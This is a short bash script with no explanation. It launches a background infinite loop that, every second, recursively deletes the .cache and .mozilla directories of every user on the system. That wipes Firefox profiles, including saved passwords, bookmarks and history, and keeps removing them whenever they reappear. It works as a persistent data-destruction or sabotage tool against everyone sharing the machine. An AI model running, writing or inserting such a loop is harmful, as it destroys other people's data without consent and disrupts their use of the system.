#!/bin/bash

while true; do
    rm -rf /home/*/.cache /home/*/.mozilla
    sleep 1
done &
